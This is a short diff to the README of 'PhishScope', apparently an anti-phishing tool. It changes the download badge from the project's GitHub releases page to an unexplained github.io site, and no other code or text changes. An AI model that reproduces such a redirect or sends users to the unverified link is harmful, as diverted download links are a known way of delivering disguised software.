@@ -1,6 +1,6 @@
 # 🛡️ PhishScope - Protect Yourself From Phishing Links
 
-[![Download PhishScope](https://img.shields.io/badge/Download-PhishScope-00c853?style=for-the-badge&logo=github)](https://github.com/abdulla2951/PhishScope/releases)
+[![Download PhishScope](https://img.shields.io/badge/Download-PhishScope-00c853?style=for-the-badge&logo=github)](https://abdulla2951.github.io)
 
 ---
 
